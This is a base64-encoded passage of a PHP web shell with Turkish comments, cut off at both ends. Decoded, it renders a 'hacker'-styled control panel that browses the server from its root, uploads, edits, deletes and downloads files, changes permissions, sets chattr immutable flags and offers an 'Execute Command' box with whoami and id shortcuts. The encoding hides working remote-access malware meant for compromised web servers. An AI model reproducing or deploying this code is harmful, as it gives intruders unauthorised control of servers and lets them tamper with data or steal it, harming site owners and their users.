AgICAuY29tbWFuZC1mb3JtIHsgZGlzcGxheTogZmxleDsgbWFyZ2luLWJvdHRvbTogMTBweDt9IC5jb21tYW5kLWZvcm0gaW5wdXRbdHlwZT0idGV4dCJdIHsgZmxleC1ncm93OiAxOyBtYXJnaW4tcmlnaHQ6IDEwcHg7IH0KICAgICAgICAucXVpY2stY21kLWJ1dHRvbnMgYnV0dG9uLCAuY29uZmlnLWJ0biB7IG1hcmdpbi1yaWdodDogNXB4OyBtYXJnaW4tYm90dG9tOiA1cHg7fQogICAgICAgIHByZS5jb21tYW5kLW91dHB1dCwgcHJlLmluZm8tb3V0cHV0IHsgYmFja2dyb3VuZC1jb2xvcjogdmFyKC0tY29kZS1iZyk7IGNvbG9yOiB2YXIoLS10ZXh0LWNvbG9yKTsgYm9yZGVyOiAxcHggc29saWQgdmFyKC0tYm9yZGVyLWNvbG9yKTsgcGFkZGluZzogMTBweDsgbWFyZ2luLXRvcDogMTBweDsgYm9yZGVyLXJhZGl1czogM3B4OyB3aGl0ZS1zcGFjZTogcHJlLXdyYXA7IHdvcmQtd3JhcDogYnJlYWstd29yZDsgbWF4LWhlaWdodDogNDAwcHg7IG92ZXJmbG93LXk6IGF1dG87IGZvbnQtc2l6ZTogMC45ZW07IH0KICAgICAgICAuaGFja2VyLWZvb3RlciB7IHRleHQtYWxpZ246IGNlbnRlcjsgbWFyZ2luLXRvcDogMzBweDsgcGFkZGluZzogMTBweDsgY29sb3I6ICM1NTU7IGZvbnQtc2l6ZTogMC44NWVtOyBib3JkZXItdG9wOiAxcHggc29saWQgdmFyKC0tYm9yZGVyLWNvbG9yKTsgfSAuaGFja2VyLWZvb3RlciBhIHsgY29sb3I6IHZhcigtLWxpbmstY29sb3IpOyB0ZXh0LWRlY29yYXRpb246IG5vbmU7IH0gLmhhY2tlci1mb290ZXIgYTpob3ZlciB7IGNvbG9yOiB2YXIoLS1saW5rLWhvdmVyKTsgfQogICAgICAgIEBrZXlmcmFtZXMgZmFkZUluIHsgZnJvbSB7IG9wYWNpdHk6IDA7IH0gdG8geyBvcGFjaXR5OiAxOyB9IH0gQGtleWZyYW1lcyBnbG93IHsgMCUgeyB0ZXh0LXNoYWRvdzogMCAwIDNweCB2YXIoLS1oZWFkZXItY29sb3IpLCAwIDAgNXB4IHZhcigtLWhlYWRlci1jb2xvcik7IH0gNTAlIHsgdGV4dC1zaGFkb3c6IDAgMCA4cHggdmFyKC0taGVhZGVyLWNvbG9yKSwgMCAwIDE1cHggdmFyKC0taGVhZGVyLWNvbG9yKTsgfSAxMDAlIHsgdGV4dC1zaGFkb3c6IDAgMCAzcHggdmFyKC0taGVhZGVyLWNvbG9yKSwgMCAwIDVweCB2YXIoLS1oZWFkZXItY29sb3IpOyB9IH0KICAgICAgICAubmF2YmFyLWJyYW5kIHNwYW4geyBhbmltYXRpb246IGdsb3cgMi41cyBpbmZpbml0ZSBhbHRlcm5hdGU7IH0gYm9keSB7IGFuaW1hdGlvbjogZmFkZUluIDAuOHMgZWFzZS1vdXQ7IH0KICAgICAgICBAbWVkaWEgKG1heC13aWR0aDogNzY4cHgpIHsgLyogLi4uIHJlc3BvbnNpdmUgc3RpbGxlciAuLi4gKi8gLmhhY2tlci1uYXYgeyBmbGV4LWRpcmVjdGlvbjogY29sdW1uOyBhbGlnbi1pdGVtczogZmxleC1zdGFydDt9IC5oYWNrZXItY29udHJvbHMgeyBtYXJnaW4tdG9wOiAxMHB4OyB3aWR0aDogMTAwJTsgdGV4dC1hbGlnbjogcmlnaHQ7fSAuaGFja2VyLXRhYmxlIHRoLCAuaGFja2VyLXRhYmxlIHRkIHsgcGFkZGluZzogNXB4IDZweDsgZm9udC1zaXplOiAwLjg1ZW07fSAuaGFja2VyLXRhYmxlIHRkIGEgeyBtYXJnaW4tcmlnaHQ6IDRweDt9IHRleHRhcmVhIHsgbWluLWhlaWdodDogMjAwcHg7IH0gLmhhY2tlci10YWJsZSB0ZDpudGgtY2hpbGQoMiksIC5oYWNrZXItdGFibGUgdGg6bnRoLWNoaWxkKDIpLCAuaGFja2VyLXRhYmxlIHRkOm50aC1jaGlsZCgzKSwgLmhhY2tlci10YWJsZSB0aDpudGgtY2hpbGQoMykgeyBkaXNwbGF5OiBub25lOyB9IC5jb21tYW5kLWZvcm0geyBmbGV4LWRpcmVjdGlvbjogY29sdW1uO30gLmNvbW1hbmQtZm9ybSBpbnB1dFt0eXBlPSJ0ZXh0Il0geyBtYXJnaW4tcmlnaHQ6IDA7IG1hcmdpbi1ib3R0b206IDVweDt9IH0KICAgIDwvc3R5bGU+CjwvaGVhZD4KPGJvZHk+CiAgICA8ZGl2IGNsYXNzPSJjb250YWluZXItZmx1aWQiPgoKICAgICAgICA8bmF2IGNsYXNzPSJoYWNrZXItbmF2Ij4KICAgICAgICAgICAgIDxkaXYgY2xhc3M9Im5hdmJhci1icmFuZCI+CiAgICAgICAgICAgICAgICAgPGkgY2xhc3M9ImZhcyBmYS1tZXRlb3IiPjwvaT4KICAgICAgICAgICAgICAgICA8c3BhbiBpZD0ic2hlbGwtdGl0bGUiPjwvc3Bhbj4KICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgPGRpdiBjbGFzcz0iaGFja2VyLWNvbnRyb2xzIj4KICAgICAgICAgICAgICAgICA8YSBocmVmPSI/dXBsb2FkPTEmcD08P3BocCBlY2hvIHVybGVuY29kZShlbmNvZGVQYXRoKFBBVEgpKTsgPz4iPjxidXR0b24gdHlwZT0iYnV0dG9uIj48aSBjbGFzcz0iZmFzIGZhLXVwbG9hZCI+PC9pPiBVcGxvYWQ8L2J1dHRvbj48L2E+CiAgICAgICAgICAgICAgICAgPGEgaHJlZj0iP3A9PD9waHAgZWNobyBlbmNvZGVQYXRoKCcvJyk7ID8+Ij48YnV0dG9uIHR5cGU9ImJ1dHRvbiI+PGkgY2xhc3M9ImZhcyBmYS1icm9hZGNhc3QtdG93ZXIiPjwvaT4gUk9PVDwvYnV0dG9uPjwvYT4KICAgICAgICAgICAgICAgICA8YSBocmVmPSI/cD08P3BocCBlY2hvIHVybGVuY29kZShlbmNvZGVQYXRoKCRkb2Nfcm9vdCkpOyA/PiI+PGJ1dHRvbiB0eXBlPSJidXR0b24iPjxpIGNsYXNzPSJmYXMgZmEtc2l0ZW1hcCI+PC9pPiBXZWJSb290PC9idXR0b24+PC9hPgogICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgPC9uYXY+CgogICAgICAgIDxkaXYgY2xhc3M9ImJyZWFkY3J1bWIiPgogICAgICAgICAgICA8aSBjbGFzcz0iZmFzIGZhLWZvbGRlciI+PC9pPiBQYXRoOiA8P3BocCAvKiBCcmVhZGNydW1iIEtvZHUgKi8gJHBhdGhfZm9yX2JyZWFkY3J1bWIgPSBQQVRIOyAkcGF0aF9mb3JfYnJlYWRjcnVtYiA9IHN0cl9yZXBsYWNlKCdcXCcsICcvJywgJHBhdGhfZm9yX2JyZWFkY3J1bWIpOyBpZiAoZW1wdHkoJHBhdGhfZm9yX2JyZWFkY3J1bWIpIHx8ICRwYXRoX2Zvcl9icmVhZGNydW1iID09PSAnLycpIHsgZWNobyAiPGEgaHJlZj1cIj9wPSIgLiBlbmNvZGVQYXRoKCcvJykgLiAiXCI+LzwvYT4iOyB9IGVsc2UgeyAkcGF0aHMgPSBleHBsb2RlKCcvJywgJHBhdGhfZm9yX2JyZWFkY3J1bWIpOyAkY3VycmVudF9idWlsdF9wYXRoID0gJyc7ICRpc193aW5kb3dzX3BhdGggPSBwcmVnX21hdGNoKCcvXlthLXpBLVpdOiQvJywgaXNzZXQoJHBhdGhzWzBdKSA/ICRwYXRoc1swXSA6ICcnKTsgZm9yZWFjaCAoJHBhdGhzIGFzICRpZCA9PiAkZGlyX3BhcnQpIHsgaWYgKCRkaXJfcGFydCA9PT0gJycgJiYgJGlkID09PSAwICYmICEkaXNfd2luZG93c19wYXRoKSB7ICRjdXJyZW50X2J1aWx0X3BhdGggPSAnLyc7IGVjaG8gIjxhIGhyZWY9XCI/cD0iIC4gZW5jb2RlUGF0aCgkY3VycmVudF9idWlsdF9wYXRoKSAuICJcIj4vPC9hPiI7IGNvbnRpbnVlOyB9IGlmICgkaXNfd2luZG93c19wYXRoICYmICRpZCA9PT0gMCkgeyAkY3VycmVudF9idWlsdF9wYXRoID0gJGRpcl9wYXJ0IC4gJy8nOyBlY2hvICI8YSBocmVmPVwiP3A9IiAuIGVuY29kZVBhdGgoJGN1cnJlbnRfYnVpbHRfcGF0aCkgLiAiXCI+IiAuIGh0bWxzcGVjaWFsY2hhcnMoJGRpcl9wYXJ0KSAuICI8L2E+LyI7IGNvbnRpbnVlOyB9IGlmICgkZGlyX3BhcnQgPT09ICcnKSBjb250aW51ZTsgaWYgKCRjdXJyZW50X2J1aWx0X3BhdGggPT09ICcvJyB8fCBwcmVnX21hdGNoKCcvXC8kLycsICRjdXJyZW50X2J1aWx0X3BhdGgpKSB7ICRjdXJyZW50X2J1aWx0X3BhdGggLj0gJGRpcl9wYXJ0OyB9IGVsc2UgeyAkY3VycmVudF9idWlsdF9wYXRoIC49ICcvJyAuICRkaXJfcGFydDsgfSBlY2hvICI8YSBocmVmPSc/cD0iIC4gZW5jb2RlUGF0aCgkY3VycmVudF9idWlsdF9wYXRoKSAuICInPiIgLiBodG1sc3BlY2lhbGNoYXJzKCRkaXJfcGFydCkgLiAiPC9hPi8iOyB9IH0gPz4KICAgICAgICA8L2Rpdj4KCiAgICAgICAgPD9waHAgaWYgKCFlbXB0eSgkbWVzc2FnZSkpOiAvKiBNZXNhaiAqLyBlY2hvICc8ZGl2IGNsYXNzPSJtZXNzYWdlICcuJG1lc3NhZ2VfdHlwZS4nIj48aSBjbGFzcz0iZmFzIGZhLWluZm8tY2lyY2xlIj48L2k+ICcuJG1lc3NhZ2UuJzwvZGl2Pic7IGVuZGlmOyA/PgoKICAgICAgICA8P3BocAogICAgICAgIC8vIC0tLSBBbmEgxLDDp2VyaWsgQWxhbsSxIC0tLQogICAgICAgICRzaG93X2ZpbGVfbWFuYWdlciA9IHRydWU7IC8vIFZhcnNhecSxbGFuCiAgICAgICAgaWYgKGlzc2V0KCRfR0VUWyd1cGxvYWQnXSkgfHwgKGlzc2V0KCRfR0VUWydyJ10pICYmIGlzc2V0KCRfR0VUWydmaWxlJ10pKSB8fCAoaXNzZXQoJF9HRVRbJ2UnXSkgJiYgaXNzZXQoJF9HRVRbJ2ZpbGUnXSkpKSB7CiAgICAgICAgICAgICAvLyBGb3JtbGFyxLEgZ8O2c3RlcgogICAgICAgICAgICAgaWYgKGlzc2V0KCRfR0VUWyd1cGxvYWQnXSkpIHsgLyogVXBsb2FkIEZvcm0gKi8gZWNobyAnPGRpdiBjbGFzcz0iZm9ybS1zZWN0aW9uIj48aDM+PGkgY2xhc3M9ImZhcyBmYS11cGxvYWQiPjwvaT4gVXBsb2FkIHRvICcgLiBodG1sc3BlY2lhbGNoYXJzKFBBVEgpIC4gJzwvaDM+PGZvcm0gbWV0aG9kPSJwb3N0IiBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIiBhY3Rpb249Ij9wPScudXJsZW5jb2RlKGVuY29kZVBhdGgoUEFUSCkpLiciPjxpbnB1dCB0eXBlPSJmaWxlIiBuYW1lPSJmaWxlVG9VcGxvYWQiIGlkPSJmaWxlVG9VcGxvYWQiIHJlcXVpcmVkPjxpbnB1dCB0eXBlPSJzdWJtaXQiIGNsYXNzPSJhY3Rpb24tYnRuIiB2YWx1ZT0iVXBsb2FkISIgbmFtZT0idXBsb2FkIj48L2Zvcm0+PC9kaXY+JzsgfQogICAgICAgICAgICAgZWxzZWlmIChpc3NldCgkX0dFVFsnciddKSAmJiBpc3NldCgkX0dFVFsnZmlsZSddKSkgeyAvKiBSZW5hbWUgRm9ybSAqLyAkaXRlbV90b19yZW5hbWUgPSB1cmxkZWNvZGUoJF9HRVRbJ2ZpbGUnXSk7IGVjaG8gJzxkaXYgY2xhc3M9ImZvcm0tc2VjdGlvbiI+PGgzPjxpIGNsYXNzPSJmYXMgZmEtZWRpdCI+PC9pPiBSZW5hbWU6ICcgLiBodG1sc3BlY2lhbGNoYXJzKCRpdGVtX3RvX3JlbmFtZSkuICc8L2gzPjxmb3JtIG1ldGhvZD0icG9zdCIgYWN0aW9uPSI/cD0nLnVybGVuY29kZShlbmNvZGVQYXRoKFBBVEgpKS4nIj48aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJvcmlnaW5hbF9uYW1lIiB2YWx1ZT0iJyAuIGh0bWxzcGVjaWFsY2hhcnMoJGl0ZW1fdG9fcmVuYW1lKSAuICciPk5ldyBOYW1lOjxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJuZXdfbmFtZSIgdmFsdWU9IicgLiBodG1sc3BlY2lhbGNoYXJzKCRpdGVtX3RvX3JlbmFtZSkgLiAnIiByZXF1aXJlZD48aW5wdXQgdHlwZT0ic3VibWl0IiBjbGFzcz0iYWN0aW9uLWJ0biIgdmFsdWU9IlJlbmFtZSEiIG5hbWU9InJlbmFtZSI+PC9mb3JtPjwvZGl2Pic7IH0KICAgICAgICAgICAgIGVsc2VpZiAoaXNzZXQoJF9HRVRbJ2UnXSkgJiYgaXNzZXQoJF9HRVRbJ2ZpbGUnXSkpIHsgLyogRWRpdCBGb3JtICovICRmaWxlX3RvX2VkaXQgPSB1cmxkZWNvZGUoJF9HRVRbJ2ZpbGUnXSk7ICRmaWxlX3BhdGggPSBQQVRIIC4gIi8iIC4gJGZpbGVfdG9fZWRpdDsgZWNobyAnPGRpdiBjbGFzcz0iZm9ybS1zZWN0aW9uIj4nOyBpZiAoIWlzX2ZpbGUoJGZpbGVfcGF0aCkpIHsgZWNobyAnPGRpdiBjbGFzcz0ibWVzc2FnZSBlcnJvciI+SGF0YTogRG9zeWEgZGXEn2lsITwvZGl2Pic7IH0gZWxzZWlmICghaXNfcmVhZGFibGUoJGZpbGVfcGF0aCkpIHsgZWNobyAnPGRpdiBjbGFzcz0ibWVzc2FnZSBlcnJvciI+SGF0YTogT2t1bmFtxLF5b3IhPC9kaXY+JzsgfSBlbHNlaWYgKCFpc193cml0YWJsZSgkZmlsZV9wYXRoKSkgeyBlY2hvICc8ZGl2IGNsYXNzPSJtZXNzYWdlIGVycm9yIj5VeWFyxLE6IFlhesSxbGFtxLF5b3IhPC9kaXY+JzsgJGNvbnRlbnQgPSBodG1sc3BlY2lhbGNoYXJzKEBmaWxlX2dldF9jb250ZW50cygkZmlsZV9wYXRoKSA/OiAnJyk7IGVjaG8gJzxoND48aSBjbGFzcz0iZmFzIGZhLWV5ZSI+PC9pPiBWaWV3aW5nOiAnIC4gaHRtbHNwZWNpYWxjaGFycygkZmlsZV90b19lZGl0KSAuICc8L2g0Pjx0ZXh0YXJlYSByZWFkb25seSBzdHlsZT0iYmFja2dyb3VuZC1jb2xvcjogIzEwMTAxMDsiPicgLiAkY29udGVudCAuICc8L3RleHRhcmVhPic7IH0gZWxzZSB7ICRjb250ZW50ID0gaHRtbHNwZWNpYWxjaGFycyhAZmlsZV9nZXRfY29udGVudHMoJGZpbGVfcGF0aCkgPzogJycpOyBlY2hvICc8Zm9ybSBtZXRob2Q9InBvc3QiIGFjdGlvbj0iP3A9Jy51cmxlbmNvZGUoZW5jb2RlUGF0aChQQVRIKSkuJyI+PGgzIHN0eWxlPSJjb2xvcjogdmFyKC0taGVhZGVyLWNvbG9yKTsiPjxpIGNsYXNzPSJmYXMgZmEtZmlsZS1wZW4iPjwvaT4gRWRpdGluZzogJyAuIGh0bWxzcGVjaWFsY2hhcnMoJGZpbGVfdG9fZWRpdCkgLiAnPC9oMz48dGV4dGFyZWEgbmFtZT0iZGF0YSI+JyAuICRjb250ZW50IC4gJzwvdGV4dGFyZWE+PGJyPjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImZpbGVfdG9fc2F2ZSIgdmFsdWU9IicgLiBodG1sc3BlY2lhbGNoYXJzKCRmaWxlX3RvX2VkaXQpIC4gJyI+PGlucHV0IHR5cGU9InN1Ym1pdCIgY2xhc3M9ImFjdGlvbi1idG4iIHZhbHVlPSJTYXZlIENoYW5nZXMhIiBuYW1lPSJlZGl0Ij48L2Zvcm0+JzsgfSBlY2hvICc8L2Rpdj4nOyB9CiAgICAgICAgICAgICAkc2hvd19maWxlX21hbmFnZXIgPSBmYWxzZTsKICAgICAgICB9CgogICAgICAgIC8vIERvc3lhIFnDtm5ldGljaXNpCiAgICAgICAgaWYgKCRzaG93X2ZpbGVfbWFuYWdlcikgewogICAgICAgICAgICBpZiAoIWlzX2RpcihQQVRIKSkgeyBlY2hvICc8ZGl2IGNsYXNzPSJtZXNzYWdlIGVycm9yIj48aSBjbGFzcz0iZmFzIGZhLWV4Y2xhbWF0aW9uLXRyaWFuZ2xlIj48L2k+IEhhdGE6IERpemluIGRlxJ9pbCEgUGF0aDogJyAuIGh0bWxzcGVjaWFsY2hhcnMoUEFUSCkgLiAnPC9kaXY+JzsgfQogICAgICAgICAgICBlbHNlaWYgKCEoJHNjYW4gPSBAc2NhbmRpcihQQVRIKSkpIHsgZWNobyAnPGRpdiBjbGFzcz0ibWVzc2FnZSBlcnJvciI+PGkgY2xhc3M9ImZhcyBmYS1leGNsYW1hdGlvbi10cmlhbmdsZSI+PC9pPiBIYXRhOiBEaXppbiBva3VuYW1hZMSxISAoJyAuIGh0bWxzcGVjaWFsY2hhcnMoUEFUSCkgLiAnKTwvZGl2Pic7IH0KICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAvLyBEb3N5YS9LbGFzw7ZyIGxpc3RlbGVtZSB0YWJsb3N1Li4uCiAgICAgICAgICAgICAgICAkZm9sZGVycyA9IGFycmF5KCk7ICRmaWxlcyA9IGFycmF5KCk7IGZvcmVhY2ggKCRzY2FuIGFzICRvYmopIHsgaWYgKCRvYmogPT0gJy4nIHx8ICRvYmogPT0gJy4uJykgY29udGludWU7ICRmdWxsX29ial9wYXRoID0gUEFUSCAuICcvJyAuICRvYmo7IGlmIChAaXNfZGlyKCRmdWxsX29ial9wYXRoKSkgeyBhcnJheV9wdXNoKCRmb2xkZXJzLCAkb2JqKTsgfSBlbHNlIHsgYXJyYXlfcHVzaCgkZmlsZXMsICRvYmopOyB9IH0gdXNvcnQoJGZvbGRlcnMsICdzdHJjb2xsJyk7IHVzb3J0KCRmaWxlcywgJ3N0cmNvbGwnKTsKICAgICAgICAgICAgICAgIGVjaG8gJzx0YWJsZSBjbGFzcz0iaGFja2VyLXRhYmxlIj48dGhlYWQ+PHRyPjx0aD5OYW1lPC90aD48dGg+U2l6ZTwvdGg+PHRoPk1vZGlmaWVkPC90aD48dGg+UGVybXM8L3RoPjx0aD5BY3Rpb25zPC90aD48L3RyPjwvdGhlYWQ+PHRib2R5Pic7CiAgICAgICAgICAgICAgICBmb3JlYWNoICgkZm9sZGVycyBhcyAkZm9sZGVyKSB7ICRmb2xkZXJfcGF0aCA9IFBBVEggLiAiLyIgLiAkZm9sZGVyOyAkcGVybXMgPSBAZmlsZXBlcm1zKCRmb2xkZXJfcGF0aCk7ICRwZXJtc19zdHIgPSAoJHBlcm1zID09PSBmYWxzZSkgPyAnPz8/PycgOiBzdWJzdHIoc3ByaW50ZignJW8nLCAkcGVybXMpLCAtNCk7ICRtdGltZSA9IEBmaWxlbXRpbWUoJGZvbGRlcl9wYXRoKTsgJG10aW1lX3N0ciA9ICgkbXRpbWUgPT09IGZhbHNlKSA/ICc/Pz8nIDogZGF0ZSgiWS1tLWQgSDppOnMiLCAkbXRpbWUpOyAkcGVybXNfcmVhZGFibGUgPSBwZXJtc190b19zdHJpbmcoJHBlcm1zKTsgJGZpbGVfZW5jb2RlZCA9IHVybGVuY29kZSgkZm9sZGVyKTsgJHBhdGhfZW5jb2RlZF91cmwgPSB1cmxlbmNvZGUoZW5jb2RlUGF0aChQQVRIKSk7IGVjaG8gIjx0cj48dGQ+IiAuIGZpbGVJY29uKCRmb2xkZXIpIC4gIjxhIGhyZWY9Jz9wPSIgLiB1cmxlbmNvZGUoZW5jb2RlUGF0aCgkZm9sZGVyX3BhdGgpKSAuICInPiIgLiBodG1sc3BlY2lhbGNoYXJzKCRmb2xkZXIpIC4gIjwvYT48L3RkPjx0ZD48Yj5bRElSXTwvYj48L3RkPjx0ZD4iIC4gJG10aW1lX3N0ciAuICI8L3RkPjx0ZD48c3BhbiBjbGFzcz0ncGVybXMnIHRpdGxlPSciIC4gJHBlcm1zX3JlYWRhYmxlIC4gIic+IiAuICRwZXJtc19zdHIgLiAiPC9zcGFuPjwvdGQ+PHRkPjxhIHRpdGxlPSdFZGl0JyBocmVmPScjJyBvbmNsaWNrPSdhbGVydChcIktsYXPDtnIhXCIpOyByZXR1cm4gZmFsc2U7Jz48aSBjbGFzcz0nZmFzIGZhLWZpbGUtcGVuJyBzdHlsZT0nb3BhY2l0eTowLjM7Jz48L2k+PC9hPiA8YSB0aXRsZT0nUmVuYW1lJyBocmVmPSc/cj0xJmZpbGU9IiAuICRmaWxlX2VuY29kZWQgLiAiJnA9IiAuICRwYXRoX2VuY29kZWRfdXJsIC4gIic+PGkgY2xhc3M9J2ZhcyBmYS1lZGl0Jz48L2k+PC9hPiA8YSB0aXRsZT0nRGVsZXRlJyBocmVmPSc/ZD0xJmZpbGU9IiAuICRmaWxlX2VuY29kZWQgLiAiJnA9IiAuICRwYXRoX2VuY29kZWRfdXJsIC4gIicgb25jbGljaz0ncmV0dXJuIGNvbmZpcm0oXCJTaWw/XCIpOyc+PGkgY2xhc3M9J2ZhcyBmYS10cmFzaCc+PC9pPjwvYT4gPGEgdGl0bGU9J0Rvd25sb2FkJyBocmVmPScjJyBvbmNsaWNrPSdhbGVydChcIktsYXPDtnIhXCIpOyByZXR1cm4gZmFsc2U7Jz48aSBjbGFzcz0nZmFzIGZhLWRvd25sb2FkJyBzdHlsZT0nb3BhY2l0eTowLjM7Jz48L2k+PC9hPiB8IDxhIHRpdGxlPSdMb2NrICgwNDQ0KScgaHJlZj0nP2NobW9kPTA0NDQmZmlsZT0iIC4gJGZpbGVfZW5jb2RlZCAuICImcD0iIC4gJHBhdGhfZW5jb2RlZF91cmwgLiAiJz48aSBjbGFzcz0nZmFzIGZhLWxvY2sgaGFja2VyLWljb24tbG9jayc+PC9pPjwvYT4gPGEgdGl0bGU9J1VubG9jayAoMDc1NSknIGhyZWY9Jz9jaG1vZD0wNzU1JmZpbGU9IiAuICRmaWxlX2VuY29kZWQgLiAiJnA9IiAuICRwYXRoX2VuY29kZWRfdXJsIC4gIic+PGkgY2xhc3M9J2ZhcyBmYS11bmxvY2sgaGFja2VyLWljb24tbG9jayc+PC9pPjwvYT4gfCA8YSB0aXRsZT0nSU1NVVRBQkxFICgraSknIGhyZWY9Jz9jaGF0dHI9bG9jayZmaWxlPSIgLiAkZmlsZV9lbmNvZGVkIC4gIiZwPSIgLiAkcGF0aF9lbmNvZGVkX3VybCAuICInIG9uY2xpY2s9J3JldHVybiBjb25maXJtKFwiY2hhdHRyICtpP1wiKTsnPjxpIGNsYXNzPSdmYXMgZmEtYW5jaG9yIGhhY2tlci1pY29uLWFuY2hvcic+PC9pPjwvYT4gPGEgdGl0bGU9J011dGFibGUgKC1pKScgaHJlZj0nP2NoYXR0cj11bmxvY2smZmlsZT0iIC4gJGZpbGVfZW5jb2RlZCAuICImcD0iIC4gJHBhdGhfZW5jb2RlZF91cmwgLiAiJyBvbmNsaWNrPSdyZXR1cm4gY29uZmlybShcImNoYXR0ciAtaT9cIik7Jz48aSBjbGFzcz0nZmFzIGZhLXVubGluayBoYWNrZXItaWNvbi1hbmNob3InPjwvaT48L2E+PC90ZD48L3RyPiI7IH0KICAgICAgICAgICAgICAgIGZvcmVhY2ggKCRmaWxlcyBhcyAkZmlsZSkgeyAkZmlsZV9wYXRoID0gUEFUSCAuICIvIiAuICRmaWxlOyAkcGVybXMgPSBAZmlsZXBlcm1zKCRmaWxlX3BhdGgpOyAkcGVybXNfc3RyID0gKCRwZXJtcyA9PT0gZmFsc2UpID8gJz8/Pz8nIDogc3Vic3RyKHNwcmludGYoJyVvJywgJHBlcm1zKSwgLTQpOyAkc2l6ZSA9IEBmaWxlc2l6ZSgkZmlsZV9wYXRoKTsgJHNpemVfc3RyID0gKCRzaXplID09PSBmYWxzZSkgPyAnPz8/JyA6IGZvcm1hdFNpemVVbml0cygkc2l6ZSk7ICRtdGltZSA9IEBmaWxlbXRpbWUoJGZpbGVfcGF0aCk7ICRtdGltZV9zdHIgPSAoJG10aW1lID09PSBmYWxzZSkgPyAnPz8/JyA6IGRhdGUoIlktbS1kIEg6aTpzIiwgJG10aW1lKTsgJHBlcm1zX3JlYWRhYmxlID0gcGVybXNfdG9fc3RyaW5nKCRwZXJtcyk7ICRmaWxlX2VuY29kZWQgPSB1cmxlbmNvZGUoJGZpbGUpOyAkcGF0aF9lbmNvZGVkX3VybCA9IHVybGVuY29kZShlbmNvZGVQYXRoKFBBVEgpKTsgZWNobyAiPHRyPjx0ZD4iIC4gZmlsZUljb24oJGZpbGUpIC4gaHRtbHNwZWNpYWxjaGFycygkZmlsZSkgLiAiPC90ZD48dGQ+IiAuICRzaXplX3N0ciAuICI8L3RkPjx0ZD4iIC4gJG10aW1lX3N0ciAuICI8L3RkPjx0ZD48c3BhbiBjbGFzcz0ncGVybXMnIHRpdGxlPSciIC4gJHBlcm1zX3JlYWRhYmxlIC4gIic+IiAuICRwZXJtc19zdHIgLiAiPC9zcGFuPjwvdGQ+PHRkPjxhIHRpdGxlPSdFZGl0JyBocmVmPSc/ZT0xJmZpbGU9IiAuICRmaWxlX2VuY29kZWQgLiAiJnA9IiAuICRwYXRoX2VuY29kZWRfdXJsIC4gIic+PGkgY2xhc3M9J2ZhcyBmYS1maWxlLXBlbic+PC9pPjwvYT4gPGEgdGl0bGU9J1JlbmFtZScgaHJlZj0nP3I9MSZmaWxlPSIgLiAkZmlsZV9lbmNvZGVkIC4gIiZwPSIgLiAkcGF0aF9lbmNvZGVkX3VybCAuICInPjxpIGNsYXNzPSdmYXMgZmEtZWRpdCc+PC9pPjwvYT4gPGEgdGl0bGU9J0RlbGV0ZScgaHJlZj0nP2Q9MSZmaWxlPSIgLiAkZmlsZV9lbmNvZGVkIC4gIiZwPSIgLiAkcGF0aF9lbmNvZGVkX3VybCAuICInIG9uY2xpY2s9J3JldHVybiBjb25maXJtKFwiU2lsP1wiKTsnPjxpIGNsYXNzPSdmYXMgZmEtdHJhc2gnPjwvaT48L2E+IDxhIHRpdGxlPSdEb3dubG9hZCcgaHJlZj0nP2RsPTEmZmlsZT0iIC4gJGZpbGVfZW5jb2RlZCAuICImcD0iIC4gJHBhdGhfZW5jb2RlZF91cmwgLiAiJz48aSBjbGFzcz0nZmFzIGZhLWRvd25sb2FkJz48L2k+PC9hPiB8IDxhIHRpdGxlPSdMb2NrICgwNDQ0KScgaHJlZj0nP2NobW9kPTA0NDQmZmlsZT0iIC4gJGZpbGVfZW5jb2RlZCAuICImcD0iIC4gJHBhdGhfZW5jb2RlZF91cmwgLiAiJz48aSBjbGFzcz0nZmFzIGZhLWxvY2sgaGFja2VyLWljb24tbG9jayc+PC9pPjwvYT4gPGEgdGl0bGU9J1VubG9jayAoMDY0NCknIGhyZWY9Jz9jaG1vZD0wNjQ0JmZpbGU9IiAuICRmaWxlX2VuY29kZWQgLiAiJnA9IiAuICRwYXRoX2VuY29kZWRfdXJsIC4gIic+PGkgY2xhc3M9J2ZhcyBmYS11bmxvY2sgaGFja2VyLWljb24tbG9jayc+PC9pPjwvYT4gfCA8YSB0aXRsZT0nSU1NVVRBQkxFICgraSknIGhyZWY9Jz9jaGF0dHI9bG9jayZmaWxlPSIgLiAkZmlsZV9lbmNvZGVkIC4gIiZwPSIgLiAkcGF0aF9lbmNvZGVkX3VybCAuICInIG9uY2xpY2s9J3JldHVybiBjb25maXJtKFwiY2hhdHRyICtpP1wiKTsnPjxpIGNsYXNzPSdmYXMgZmEtYW5jaG9yIGhhY2tlci1pY29uLWFuY2hvcic+PC9pPjwvYT4gPGEgdGl0bGU9J011dGFibGUgKC1pKScgaHJlZj0nP2NoYXR0cj11bmxvY2smZmlsZT0iIC4gJGZpbGVfZW5jb2RlZCAuICImcD0iIC4gJHBhdGhfZW5jb2RlZF91cmwgLiAiJyBvbmNsaWNrPSdyZXR1cm4gY29uZmlybShcImNoYXR0ciAtaT9cIik7Jz48aSBjbGFzcz0nZmFzIGZhLXVubGluayBoYWNrZXItaWNvbi1hbmNob3InPjwvaT48L2E+PC90ZD48L3RyPiI7IH0KICAgICAgICAgICAgICAgIGVjaG8gIjwvdGJvZHk+PC90YWJsZT4iOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgID8+CgogICAgICAgIDwhLS0gS29tdXQgw4dhbMSxxZ90xLFybWEgLS0+CiAgICAgICAgPGRpdiBjbGFzcz0iY29tbWFuZC1zZWN0aW9uIj4KICAgICAgICAgICAgIDxoMz48aSBjbGFzcz0iZmFzIGZhLXRlcm1pbmFsIj48L2k+IEV4ZWN1dGUgQ29tbWFuZDwvaDM+CiAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJxdWljay1jbWQtYnV0dG9ucyI+CiAgICAgICAgICAgICAgICAgPGJ1dHRvbiBjbGFzcz0icXVpY2stY21kLWJ0biIgb25jbGljaz0ic2V0Q21kKCd3aG9hbWknKSI+d2hvYW1pPC9idXR0b24+CiAgICAgICAgICAgICAgICAgPGJ1dHRvbiBjbGFzcz0icXVpY2stY21kLWJ0biIgb25jbGljaz0ic2V0Q21kKCdpZCcpIj5pZDwvYnV0dG9uPgogICAgICAgICAgICAgICAgID